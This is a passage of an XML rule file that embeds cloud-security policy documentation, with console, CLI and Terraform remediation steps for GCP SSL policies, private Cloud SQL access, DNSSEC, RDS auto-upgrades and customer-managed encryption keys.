<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Secure Sockets Layer (SSL) policies determine what port Transport Layer Security (TLS) features clients are permitted to use when connecting to load balancers. SSL policies control the features of SSL in Google Cloud SSL proxy load balancer and external HTTP(S) load balancers. By default, HTTP(S) Load Balancing and SSL Proxy Load Balancing use a set of SSL features that provides good security and wide compatibility. </p>
<p>To prevent usage of insecure features, SSL policies should use one of the following three options:</p>
<ol>
<li>At least TLS 1.2 with the MODERN profile; or </li>
<li>The RESTRICTED profile, because it effectively requires clients to use TLS 1.2 regardless of the chosen minimum TLS version; or </li>
<li>A CUSTOM profile that does not support any of the following features:</li>
</ol>
<ul>
<li>TLS_RSA_WITH_AES_128_GCM_SHA256</li>
<li>TLS_RSA_WITH_AES_256_GCM_SHA384</li>
<li>TLS_RSA_WITH_AES_128_CBC_SHA</li>
<li>TLS_RSA_WITH_AES_256_CBC_SHA</li>
<li>TLS_RSA_WITH_3DES_EDE_CBC_SHA</li>
</ul>
<p>Load balancers are used to efficiently distribute traffic across multiple servers. Both SSL proxy and HTTPS load balancers are external load balancers: they distribute traffic from the Internet to a GCP network. GCP customers can configure load balancer SSL policies with a minimum TLS version (1.0, 1.1, or 1.2) that clients can use to establish a connection, along with a profile (Compatible, Modern, Restricted, or Custom) that specifies permissible and insecure cipher suites. It is easy for customers to configure a load balancer without knowing they are permitting outdated cipher suites.</p>
<p>It is possible to define SSL policies to control the features of SSL that your load balancer negotiates with clients. An SSL policy can be configured to determine the minimum TLS version and SSL features that are enabled in the load balancer. We recommend you select TLS 1.2 as the minimum TLS version supported.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>If the <strong>TargetSSLProxy</strong> or <strong>TargetHttpsProxy</strong> does not have an SSL policy configured, create a new SSL policy. Otherwise, modify the existing insecure policy.</p>
<p>To change the policy using the GCP Console, follow these steps:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/net-security/sslpolicies" target="_self">SSL Policies</a>.</li>
<li>Click on the name of the insecure policy to go to its <strong>SSL policy details</strong> page.</li>
<li>Click <strong>EDIT</strong>.</li>
<li>Set <strong>Minimum TLS version</strong> to <strong>TLS 1.2</strong>.</li>
<li>Set <strong>Profile</strong> to <strong>Modern</strong> or <strong>Restricted</strong>.</li>
<li>Alternatively, if the user selects the profile <strong>Custom</strong>, make sure that the following features are disabled:</li>
</ol>
<ul>
<li>TLS_RSA_WITH_AES_128_GCM_SHA256</li>
<li>TLS_RSA_WITH_AES_256_GCM_SHA384</li>
<li>TLS_RSA_WITH_AES_128_CBC_SHA</li>
<li>TLS_RSA_WITH_AES_256_CBC_SHA</li>
<li>TLS_RSA_WITH_3DES_EDE_CBC_SHA</li>
</ul>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<ol>
<li>For each insecure SSL policy, update it to use secure cyphers:</li>
</ol>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud compute ssl-policies update NAME 
[--profile COMPATIBLE|MODERN|RESTRICTED|CUSTOM] 
--min-tls-version 1.2 [--custom-features FEATURES]
</code></pre>
<ol start="2">
<li>If the target proxy has a GCP default SSL policy, use the following command corresponding to the proxy type to update it:</li>
</ol>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud compute target-ssl-proxies update TARGET_SSL_PROXY_NAME 
--ssl-policy SSL_POLICY_NAME
gcloud compute target-https-proxies update TARGET_HTTPS_POLICY_NAME 
--sslpolicy SSL_POLICY_NAME
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li>
<p><strong>Resource</strong>: google_compute_ssl_policy</p>
</li>
<li>
<p><strong>Argument</strong>: profile = MODERN</p>
</li>
<li>
<p><strong>Resource</strong>: google_compute_ssl_policy</p>
</li>
<li>
<p><strong>Arguments</strong>:<br/>
profile = CUSTOM<br/>
custom_features = [<!-- -->]</p>
</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">//Option 1
resource "google_compute_ssl_policy" "modern-profile" {
  name            = "nonprod-ssl-policy"
+ profile         = "MODERN"
+ min_tls_version = "TLS_1_2"
}

//Option 2
resource "google_compute_ssl_policy" "custom-profile" {
  name            = "custom-ssl-policy"
+ profile         = "CUSTOM"
  min_tls_version = "TLS_1_2"
+ custom_features = ["TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384", "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384"]
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_networking_3' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_networking_3</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_networking_3' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AZURE_11</key>
    <name>Ensure Azure Data Explorer encryption at rest uses a customer-managed key</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-data-explorer-encryption-at-rest-does-not-use-a-customer-managed-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-data-explorer-encryption-at-rest-does-not-use-a-customer-managed-key"></div>Azure Data Explorer encryption at rest does not use a customer-managed key</div><a aria-label="Skip link to Azure Data Explorer encryption at rest does not use a customer-managed key" class="heading-anchor-icon fa fa-anchor" href="#azure-data-explorer-encryption-at-rest-does-not-use-a-customer-managed-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enabling encryption at rest using a customer-managed key on your Azure Data Explorer cluster provides additional control over the key being used by the encryption at rest. This feature is oftentimes applicable to customers with special compliance requirements and requires a Key Vault to managing the keys.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_kusto_cluster, azurerm_kusto_cluster_customer_managed_key</li>
<li><strong>Argument:</strong> cluster_id  (of <em>azurerm_kusto_cluster_customer_managed_key</em> )</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_kusto_cluster" "cluster_ok" {
  name                = "kustocluster"
  location            = azurerm_resource_group.rg.location
  resource_group_name = azurerm_resource_group.rg.name

  sku {
    name     = "Standard_D13_v2"
    capacity = 2
  }

  identity {
    type = "SystemAssigned"
  }
}

resource "azurerm_kusto_cluster_customer_managed_key" "example" {
  cluster_id   = azurerm_kusto_cluster.cluster_ok.id
  key_vault_id = azurerm_key_vault.example.id
  key_name     = azurerm_key_vault_key.example.name
  key_version  = azurerm_key_vault_key.example.version
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-azure-data-explorer-encryption-at-rest-uses-a-customer-managed-key' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-azure-data-explorer-encryption-at-rest-uses-a-customer-managed-key</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-azure-data-explorer-encryption-at-rest-uses-a-customer-managed-key' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_11</key>
    <name>Ensure Cloud SQL database instances are not publicly accessible</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="cloud-sql-database-instances-are-publicly-accessible"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-sql-database-instances-are-publicly-accessible"></div>Cloud SQL database instances are publicly accessible</div><a aria-label="Skip link to Cloud SQL database instances are publicly accessible" class="heading-anchor-icon fa fa-anchor" href="#cloud-sql-database-instances-are-publicly-accessible"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Cloud SQL is a fully managed relational database service for MySQL, PostgreSQL, and SQL Server. It offers data encryption at rest and in transit, Private connectivity with VPC and user-controlled network access with firewall protection.</p>
<p>It is possible to configure Cloud SQL to have a public IPv4 address. This means your cluster can accept connections from specific IP addresses, or a range of addresses, by adding authorized addresses to your instance. We do not recommend this option. </p>
<p>We recommend you ensure Cloud SQL Database Instances are not publicly accessible, to help secure against attackers scanning the internet in search of public databases.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>To change the policy using the GCP Console, follow these steps:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to the Cloud SQL Instances page.</li>
<li>Click the instance name to open its Overview page.</li>
<li>Select the <strong>Connections</strong> tab.</li>
<li>Select <strong>Private IP</strong> checkbox.</li>
<li>A drop-down list shows the available networks in your project. If your project is the service project of a Shared VPC, VPC networks from the host project are also shown.</li>
</ol>
<p>If you have configured private services access:<br/>
Select the VPC Network you want to use</p>
<ol>
<li>A drop-down shows the IP address range you allocated.</li>
<li>Click <strong>Connect</strong>.</li>
<li>Click <strong>Save</strong>.</li>
</ol>
<p>To let Cloud SQL allocate an IP address for you.</p>
<ol>
<li>Select the default VPC network.</li>
<li>Click <strong>Allocate and connect</strong>.</li>
<li>Click <strong>Save</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>VPC_NETWORK_NAME is the name of your chosen VPC network, for example: my-vpc-network. The --network parameter value is in the format: <a href="https://www.googleapis.com/compute/alpha/projects/%5BPROJECT_ID%5D/global/networks/%5BVPC_NETWORK_NAME" target="_self">https://www.googleapis.com/compute/alpha/projects/[PROJECT_ID]/global/networks/[VPC_NETWORK_NAME</a>]</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">gcloud --project=[PROJECT_ID] beta sql instances patch [INSTANCE_ID]
       --network=[VPC_NETWORK_NAME]
       --no-assign-ip
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: google_compute_network</li>
<li><strong>Argument</strong>: private_network (Optional)<br/>
The VPC network from which the Cloud SQL instance is accessible for private IP. For example, projects/myProject/global/networks/default. Specifying a network enables private IP. Either ipv4_enabled must be enabled or a private_network must be configured. This setting can be updated, but it cannot be removed after it is set.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_compute_network" "private_network" {
  provider = google-beta

  name = "private-network"
}

resource "google_compute_global_address" "private_ip_address" {
  provider = google-beta

  name          = "private-ip-address"
  purpose       = "VPC_PEERING"
  address_type  = "INTERNAL"
  prefix_length = 16
  network       = google_compute_network.private_network.id
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_networking_4' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_networking_4</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_networking_4' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_226</key>
    <name>Ensure AWS DB instance gets all minor upgrades automatically</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-db-instance-does-not-get-all-minor-upgrades-automatically"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-db-instance-does-not-get-all-minor-upgrades-automatically"></div>AWS DB instance does not get all minor upgrades automatically</div><a aria-label="Skip link to AWS DB instance does not get all minor upgrades automatically" class="heading-anchor-icon fa fa-anchor" href="#aws-db-instance-does-not-get-all-minor-upgrades-automatically"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>When Amazon Relational Database Service (Amazon RDS) supports a new version of a database engine, you can upgrade your DB instances to the new version. There are two kinds of upgrades: major version upgrades and minor version upgrades. Minor upgrades helps maintain a secure and stable RDS with minimal impact on the application. For this reason, we recommend that your automatic minor upgrade is enabled. Minor version upgrades only occur automatically if a minor upgrade replaces an unsafe version, such as a minor upgrade that contains bug fixes for a previous version.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>Enable RDS auto minor version upgrades.</p>
<ol>
<li>Go to the AWS console <a href="https://console.aws.amazon.com/rds/" target="_self">RDS dashboard</a>.</li>
<li>In the navigation pane, choose <strong>Instances</strong>.</li>
<li>Select the database instance you wish to configure.</li>
<li>From the <strong>Instance actions</strong> menu, select <strong>Modify</strong>.</li>
<li>Under the <strong>Maintenance</strong> section, choose <strong>Yes for Auto minor version upgrade</strong>.</li>
<li>Select <strong>Continue</strong> and then <strong>Modify DB Instance</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws rds modify-db-instance \
  --region ${region} \
  --db-instance-identifier ${resource_name} \
  --auto-minor-version-upgrade \
  --apply-immediately
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  Example:
    Type: 'AWS::RDS::DBInstance'
    Properties:
      DBName: 'example'
      DBInstanceClass: 'db.t3.micro'
      Engine: 'mysql'
      MasterUsername: 'master'
      MasterUserPassword: 'password'
+     AutoMinorVersionUpgrade: true
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_db_instance" "example" {
  allocated_storage          = 20
  engine                     = "mysql"
  engine_version             = "5.7"
  instance_class             = "db.t3.micro"
  name                       = "mydb"
  username                   = "foo"
  password                   = "foobarbaz"
  parameter_group_name       = "default.mysql5.7"
+ auto_minor_version_upgrade = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-db-instance-gets-all-minor-upgrades-automatically' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-db-instance-gets-all-minor-upgrades-automatically</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-db-instance-gets-all-minor-upgrades-automatically' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_16</key>
    <name>Ensure GCP Cloud DNS has DNSSEC enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-cloud-dns-has-dnssec-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-cloud-dns-has-dnssec-disabled"></div>GCP Cloud DNS has DNSSEC disabled</div><a aria-label="Skip link to GCP Cloud DNS has DNSSEC disabled" class="heading-anchor-icon fa fa-anchor" href="#gcp-cloud-dns-has-dnssec-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>DNSSEC is a feature of the Domain Name System that authenticates responses to domain name lookups. DNSSEC prevents attackers from manipulating or poisoning the responses to DNS requests. </p>
<p>We recommend you ensure DNSSEC is enabled in: any public DNS zone, the top level domain registry, and in the local DNS resolvers.</p>
<blockquote class="callout callout_info" theme="&#128216;"><h3 class="callout-heading"><span class="callout-icon">&#128216;</span><p>Note</p></h3><p>If <strong>visibility</strong> is set to <strong>private</strong>, then DNSSEC cannot be set, and this policy will pass.</p></blockquote>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>To change the policy using the GCP Console, follow these steps:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Click the DNSSEC setting for the existing managed zone.</li>
<li>Select "On" in the pop-up menu.</li>
<li>In the confirmation dialog, click <strong>Enable</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>You can enable DNSSEC for existing managed zones using the gcloud command line tool or the API:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud dns managed-zones update EXAMPLE_ZONE --dnssec-state on</code></p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: google_dns_managed_zone</li>
<li><strong>Argument</strong>: dnssec_config (Optional)<br/>
DNSSEC configuration Structure is documented below.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_dns_managed_zone" "example" {
        description  = "Company Domain name"
        dns_name     = "example.com."
        
      + dnssec_config { # forces replacement
          + kind          = "dns#managedZoneDnsSecConfig" # forces replacement
          + non_existence = "nsec3" # forces replacement
          + state         = "on" # forces replacement
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_networking_5' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_networking_5</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_networking_5' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_84</key>
    <name>Ensure GCP Artifact Registry repositories are encrypted with Customer Supplied Encryption Keys (CSEK)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-artifact-registry-repositories-are-not-encrypted-with-customer-supplied-encryption-keys-csek"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-artifact-registry-repositories-are-not-encrypted-with-customer-supplied-encryption-keys-csek"></div>GCP Artifact Registry repositories are not encrypted with Customer Supplied Encryption Keys (CSEK)</div><a aria-label="Skip link to GCP Artifact Registry repositories are not encrypted with Customer Supplied Encryption Keys (CSEK)" class="heading-anchor-icon fa fa-anchor" href="#gcp-artifact-registry-repositories-are-not-encrypted-with-customer-supplied-encryption-keys-csek"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Customer-Supplied Encryption Keys (CSEK) are a feature in Google Cloud Storage and Google Compute Engine. Google Compute Engine encrypts all data at rest by default. Compute Engine handles and manages this encryption automatically, with no additional action required. When you provide your own encryption keys Compute Engine uses your key to protect the Google-generated keys used to encrypt and decrypt your data. Only users that provide the correct key can use resources protected by a customer-supplied encryption key. Google does not store your keys on its servers and cannot access your protected data unless you provide the key. If you forget or lose your key Google is unable to recover the key or to recover any data encrypted with that key. To control and manage this encryption yourself, you must provide your own encryption keys.</p>
<p>We recommend you supply your own encryption keys for Google to use, at a minimum to encrypt business critical Artifact Registry repositories. This helps protect the Google-generated keys used to encrypt and decrypt your data.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<p>TBD</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<ul>
<li><strong>Resource</strong>: google_artifact_registry_repository</li>
<li><strong>Arguments</strong>: kms_key_name</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_artifact_registry_repository" "pass" {
  provider = google-beta

  location      = "us-central1"
  repository_id = "my-repository"
  description   = "example docker repository with cmek"
  format        = "DOCKER"
  kms_key_name  = google_kms_crypto_key.example.name
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-gcp-artifact-registry-repositories-are-encrypted-with-customer-supplied-encryption-keys-csek' target='_blank'> https://docs.bridgecrew.io/docs/ensure-gcp-artifact-registry-repositories-are-encrypted-with-customer-supplied-encryption-keys-csek</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
